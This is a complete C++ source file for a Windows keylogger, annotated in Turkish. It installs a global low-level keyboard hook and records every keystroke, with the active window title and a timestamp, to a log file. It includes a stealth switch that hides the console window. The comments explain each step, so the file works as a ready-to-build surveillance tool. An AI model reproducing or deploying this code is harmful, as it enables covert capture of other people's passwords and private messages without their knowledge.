#define UNICODE // Türkçe karakterler için
#include <Windows.h>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>

using namespace std;  // std:: kullanımını kaldırdım

#define visible // Programı görünür yapar (visible / invisible)

#define FORMAT 0 // Log kaydı format belirler (0=normal , 10=decimal 16=hexcode)

#define mouseignore // Clickleri görmezden gelir.
// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.

#if FORMAT == 0 //# sayesinde sadece format 0 ken çalışacak yoksa atlayacak. preprocessor (önişlemci)
const map<int, string> keyname{ //Const ile map konteyneri kurduk. int ; VK_BACK VK_SPACE gibi değelerin visual valueleri string olarak tutuyor.
    {VK_BACK, "[BACKSPACE]" }, //yani VK_BACK = 8 değeri = "[BACKSPACE]". keyname ise konteynere verdiğimiz ad.
    {VK_RETURN, "\n" },
    {VK_SPACE, "_" },
    {VK_TAB, "[TAB]" },
    {VK_SHIFT, "[SHIFT]" },
    {VK_LSHIFT, "[LSHIFT]" },
    {VK_RSHIFT, "[RSHIFT]" },
    {VK_CONTROL, "[CONTROL]" },
    {VK_LCONTROL, "[LCONTROL]" },
    {VK_RCONTROL, "[RCONTROL]" },
    {VK_MENU, "[ALT]" },
    {VK_LWIN, "[LWIN]" },
    {VK_RWIN, "[RWIN]" },
    {VK_ESCAPE, "[ESCAPE]" },
    {VK_END, "[END]" },
    {VK_HOME, "[HOME]" },
    {VK_LEFT, "[LEFT]" },
    {VK_RIGHT, "[RIGHT]" },
    {VK_UP, "[UP]" },
    {VK_DOWN, "[DOWN]" },
    {VK_PRIOR, "[PG_UP]" },
    {VK_NEXT, "[PG_DOWN]" },
    {VK_OEM_PERIOD, ". " }, // noktalar log dosyasında link gibi gözüküyordu boşluk koyarak düzelttik.
    {VK_DECIMAL, ". " },    // noktalar log dosyasında link gibi gözüküyordu boşluk koyarak düzelttik.
    {VK_OEM_PLUS, "+" },
    {VK_OEM_MINUS, "-" },
    {VK_ADD, "+" },
    {VK_SUBTRACT, "-" },
    {VK_CAPITAL, "[CAPSLOCK]" },
};
#endif

HHOOK _hook; // İşletim sistemindeki mesajları yakalamak için hook kullandık. HOOK windowsun özel veri tipi, _hook değişken
			//Kodun doğru çalışması için global tanımlanması lazım !!!

KBDLLHOOKSTRUCT kbdStruct; //Windowsun hazır structı. Klavye girdilerini windowstan alıp tutar.

int Save(int key_stroke); //ilerde save fonksiyonu var basılan tuşun kodunu tutacak.
ofstream output_file; //dosya işlemleri yapıcak loga kaydetme.


LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) //LRESULT= Mesaj işleme fonksiyonudur.(Long Result 32-64 bit)
{ // __stdcall = Fonksiyonun parametrelerini belirler. HookCallback= Hook tarafından çağırılan fonksiyon. 
// nCode= mesaj geçerli mi ? , wParam= tuşa basıldı mı ? lParam= hangi tuşa basıldı.
    if (nCode >= 0)  // nCode 0 veya pozitif sayılar geçerlidir.
    {
        
        if (wParam == WM_KEYDOWN) //bir tuşa basıldı mı ?
        {
            
         	// lParam tuş basma bilgilerini içeren KBDLLHOOKSTRUCT yapısının adresidir. Yani pointer.
			// Burada bu yapıdan gelen veriyi kopyalıyoruz.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);



            
            Save(kbdStruct.vkCode); //kaydediyor.
        }
    }

    
    return CallNextHookEx(_hook, nCode, wParam, lParam); // her bir karakter sıradaki hooku çalıştırır ve hook zinciri oluşur.
}

void SetHook() // Hooku kuran fonksiyon. SetWindowsHookEx fonksiyonunu çağırdık. WH_KEYBOARD_LL:Tüm tuş vuruşlarını yakalar.
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) //Eğer SetWindowsHookEx başarısız olursa NULL döner
    {
																// Başarısızlık durumunda hata mesajı gösteriyoruz
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

void ReleaseHook() // önceki hooku durdurur.
{
    UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    stringstream output; //İçine yazdığımız verileri birleştirip sonra dosyaya ya da ekrana yazmak için kullanılır.
    static char lastwindow[256] = ""; //Hangi pencerede olduğumuzu ve pencere değişimlerini yapar.
#ifndef mouseignore
    if ((key_stroke == 1) || (key_stroke == 2)) //Mouse clickleri yakalanmak istiyorsa çalışır bizde kapalı.
    {
        return 0; 
    }
#endif
    HWND foreground = GetForegroundWindow(); //Şuan hangi penceredeyiz onu tanımlar.
    DWORD threadID; //Thread= çalışan küçük programlar.
    HKL layout = NULL; //pencerenin klavye düzenini tutar tr en vs. çok da önemli değil ama işe yarayabilir.

    if (foreground)
    {
       
        threadID = GetWindowThreadProcessId(foreground, NULL); //pencerenin thread id sini alır.
        layout = GetKeyboardLayout(threadID); //Klavye düzenini öğrenir.
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256); //Pencere başlığını string olarak al. 

        if (strcmp(window_title, lastwindow) != 0) // Pencere başlığı değişti mi kontrol et
        {

            strncpy(lastwindow, window_title, sizeof(lastwindow) - 1); // Yeni başlığı kopyala
            lastwindow[sizeof(lastwindow) - 1] = '\0';  //String sonuna null koy, güvenlik için

            // get time
            time_t t = time(NULL); //Şu anki zamanı al
            struct tm tm;  //  Zaman bilgisini tut

#if defined(_MSC_VER) // MS Visual Studio derleyicisi için
            localtime_s(&tm, &t); //yerel zamana çevir (Windows) benimki mingw64
#elif defined(__MINGW32__) || defined(__MINGW64__) // MinGW derleyici için

            tm = *localtime(&t); 
#else // Diğer işletim sistemleri Linux, macOS, vs
            localtime_r(&t, &tm);
#endif

            char s[64];
            strftime(s, sizeof(s), "%c", &tm); // Zamanı okunabilir stringe çevir ("Sun Aug 10 22:00:00 2025") şeklinde

            output << "\n\n[Window: " << window_title << " - at " << s << "] ";
        }
    }

#if FORMAT == 10  // format decimal ise kodu köşeli parantez içinde yaz
    output << '[' << key_stroke << ']';
#elif FORMAT == 16 // format hexcode ise hex (16lık) kodu yaz
    output << hex << "[" << key_stroke << ']';
#else
    if (keyname.find(key_stroke) != keyname.end()) //Üstteki formatlar bizim için gereksiz ama ileride geliştirmek isteyenler olabilir o yüzden kalsın.
    { 												// Biz yukarda keyname isimli konteyner yapmıştık ona göre yapacağız özel isimlerle.
        output << keyname.at(key_stroke);
    }
    else
    {
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState); //O anki klavye tuşlarının durumunu al (Shift, CapsLock vb.)


        UINT scanCode = MapVirtualKeyEx(key_stroke, MAPVK_VK_TO_VSC, layout); // Tuş kodunu scan code'a çevir

        wchar_t wch[5] = {0}; //Bu dizi utf16 ama utf8 e çevireceğim birazdan.
        int result = ToUnicodeEx(key_stroke, scanCode, keyboardState, wch, 4, 0, layout); // geniş bir dizi açtık. tuş kodlarını karakterlere çevirdik.

        if (result > 0)
        {
            // utf16 wchar_t dizisini utf8 stringe çeviriyoruz
            int size_needed = WideCharToMultiByte(CP_UTF8, 0, wch, result, NULL, 0, NULL, NULL);
            string utf8str(size_needed, 0);
            WideCharToMultiByte(CP_UTF8, 0, wch, result, &utf8str[0], size_needed, NULL, NULL);

            output << utf8str; // Log akışına ekle. 


        }
        else
        {
            output << "[VK_" << key_stroke << "]"; //Çevrilemeyen tuşlar için sanal kodu yaz
        }
    }

#endif
    
    output_file << output.str(); // Logu dosyaya yaz

    output_file.flush();  // Dosyaya hemen yazdır
 
    cout << output.str();// Konsola da yaz (debug amaçlı)

    return 0;   //Fonksiyon bitti, hata yok
}

void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // görünür için
#endif

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // görünmez için
#endif
}

int main()
{
    
    const char* output_filename = "keylogger.log"; ;//buraya yazılacak
    cout << "Logging output to " << output_filename << endl;
    output_file.open(output_filename, ios_base::app); //Log dosyası açılıyor ve dosya başına değil, sonuna veri eklemek üzere açılıyo

    
    Stealth();

						 // Fonksiyonlar çağrıldı.
    SetHook();


    MSG msg; //Programın sürekli çalışmasını sağlayan döngü.
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
}
